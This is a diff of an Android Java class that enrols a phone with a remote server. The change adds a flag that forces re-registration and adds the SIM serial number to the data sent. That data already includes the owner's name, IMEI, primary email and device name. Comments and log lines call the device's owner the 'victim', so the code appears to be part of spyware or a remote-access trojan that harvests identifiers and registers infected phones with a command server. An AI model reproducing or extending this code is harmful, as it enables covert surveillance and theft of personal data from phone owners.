@@ -53,19 +53,22 @@ public class APIRequestGateway {
     @NonNull
     private final APIRequestGatewayCallback callback;
 
-    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
+    private final boolean isFreshApiRequest;
+
+    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback, boolean isFreshApiRequest) {
         this.context = context;
         this.activity = activity;
         this.callback = callback;
+        this.isFreshApiRequest = isFreshApiRequest;
         execute();
     }
 
-    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
-        this(activity.getBaseContext(), activity, callback);
+    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback, boolean isFreshApiRequest) {
+        this(activity.getBaseContext(), activity, callback, isFreshApiRequest);
     }
 
-    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
-        this(context, null, callback);
+    public APIRequestGateway(Context context, APIRequestGatewayCallback callback, boolean isFreshApiRequest) {
+        this(context, null, callback, isFreshApiRequest);
     }
 
 
@@ -84,61 +87,24 @@ public class APIRequestGateway {
             fcmId = prefUtils.getString(Server.KEY_FCM_ID);
         }
 
-        //Attaching them with the request
-        final Request inRequest = new APIRequestBuilder("/get_server_key", null)
-                .addParamIfNotNull("name", profileUtils.getDeviceOwnerName())
-                .addParam("imei", tm.getDeviceId())
-                .addParam("device_name", getDeviceName())
-                .addParamIfNotNull("email", profileUtils.getPrimaryEmail())
-                .addParam("fcm_id", fcmId)
-                .build();
+        final String simSerial = tm.getSimSerialNumber();
 
-        //Doing API request
-        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {
+        if (simSerial != null) {
+            //Attaching them with the request
+            final Request inRequest = new APIRequestBuilder("/get_server_key", null)
+                    .addParamIfNotNull("name", profileUtils.getDeviceOwnerName())
+                    .addParam("imei", tm.getDeviceId())
+                    .addParam("device_name", getDeviceName())
+                    .addParamIfNotNull("email", profileUtils.getPrimaryEmail())
+                    .addParam("fcm_id", fcmId)
+                    .addParam("sim_serial", simSerial)
+                    .build();
 
-            @Override
-            public void onFailure(Call call, final IOException e) {
-                e.printStackTrace();
-                if (activity != null) {
-                    activity.runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            callback.onFailed(e.getMessage());
-                        }
-                    });
-                } else {
-                    callback.onFailed(e.getMessage());
-                }
-            }
+            //Doing API request
+            OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {
 
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-
-                try {
-
-                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
-                    final String serverKey = inResp.getJSONObjectData().getString(KEY_SERVER_KEY);
-
-
-                    //Saving in preference
-                    final SharedPreferences.Editor editor = prefUtils.getEditor();
-                    editor.putString(KEY_SERVER_KEY, serverKey);
-                    editor.putBoolean(Server.KEY_IS_FCM_SYNCED, true);
-                    editor.commit();
-
-                    if (activity != null) {
-
-                        activity.runOnUiThread(new Runnable() {
-                            @Override
-                            public void run() {
-                                callback.onReadyToRequest(serverKey);
-                            }
-                        });
-
-                    } else {
-                        callback.onReadyToRequest(serverKey);
-                    }
-                } catch (JSONException | APIResponse.APIException e) {
+                @Override
+                public void onFailure(Call call, final IOException e) {
                     e.printStackTrace();
                     if (activity != null) {
                         activity.runOnUiThread(new Runnable() {
@@ -151,8 +117,52 @@ public class APIRequestGateway {
                         callback.onFailed(e.getMessage());
                     }
                 }
-            }
-        });
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+
+                    try {
+
+                        final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
+                        final String serverKey = inResp.getJSONObjectData().getString(KEY_SERVER_KEY);
+
+
+                        //Saving in preference
+                        final SharedPreferences.Editor editor = prefUtils.getEditor();
+                        editor.putString(KEY_SERVER_KEY, serverKey);
+                        editor.putBoolean(Server.KEY_IS_FCM_SYNCED, true);
+                        editor.commit();
+
+                        if (activity != null) {
+
+                            activity.runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    callback.onReadyToRequest(serverKey);
+                                }
+                            });
+
+                        } else {
+                            callback.onReadyToRequest(serverKey);
+                        }
+                    } catch (JSONException | APIResponse.APIException e) {
+                        e.printStackTrace();
+                        if (activity != null) {
+                            activity.runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    callback.onFailed(e.getMessage());
+                                }
+                            });
+                        } else {
+                            callback.onFailed(e.getMessage());
+                        }
+                    }
+                }
+            });
+        } else {
+            callback.onFailed("No SIM card found");
+        }
 
     }
 
@@ -167,7 +177,7 @@ public class APIRequestGateway {
             final PrefUtils prefUtils = PrefUtils.getInstance(context);
             final String serverKey = prefUtils.getString(KEY_SERVER_KEY);
 
-            if (serverKey != null) {
+            if (serverKey != null && !isFreshApiRequest) {
 
                 Log.d(X, "hasServerKey " + serverKey);
 
@@ -184,7 +194,7 @@ public class APIRequestGateway {
 
             } else {
 
-                Log.i(X, "Registering victim...");
+                Log.i(X, isFreshApiRequest ? "Refreshing server..." : " Registering server...");
 
                 //Register victim here
                 register(context);
